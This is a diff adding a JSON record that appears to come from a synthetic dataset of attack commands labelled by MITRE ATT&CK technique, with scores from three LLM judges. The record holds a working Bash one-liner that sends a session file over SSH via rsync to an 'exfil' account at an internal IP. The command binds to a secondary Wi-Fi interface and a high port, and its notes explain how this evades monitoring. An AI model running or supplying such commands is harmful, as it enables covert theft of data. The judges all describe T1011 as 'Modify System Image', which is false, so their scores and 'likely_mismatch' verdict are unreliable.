@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && rsync -a --quiet -e \"ssh -o ConnectTimeout=5 -o BindAddress=$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1) -p 49222\" /home/user/.cache/session.dat exfil@10.55.88.12:~/inbox/session.dat",
+  "explanation": "Performs rsync over SSH bound to the wlan2 source IP on a non-standard port, exfiltrating over a separate Wi\u2011Fi path consistent with T1011.",
+  "rationale_steps": [
+    "Monitor wlan2 status with iwconfig to ensure the alternate medium is available.",
+    "Bind SSH to wlan2\u2019s IP to route only over the secondary Wi\u2011Fi network.",
+    "Transfer on a high, uncommon port to reduce correlation with typical SSH traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-5d203e00",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators (&&), valid flags for iwconfig and rsync, and correct use of command substitution.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically functional for data exfiltration, it doesn't align with T1011 (Modify System Image) as it's performing data exfiltration via rsync rather than modifying firmware or OS images.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T20:01:28.972781Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command substitutions, and correct flag usage for all tools involved.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration, which is fundamentally different from 'modifying a system image' as described by T1011; the explanation's claim of consistency with T1011 is incorrect.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T20:01:40.090324Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid rsync/ssh options, correct redirections, and proper command substitution.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly exfiltrates a file over SSH bound to wlan2, it does not modify any system image or firmware and is therefore misaligned with the provided technique description.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T20:42:54.790066Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
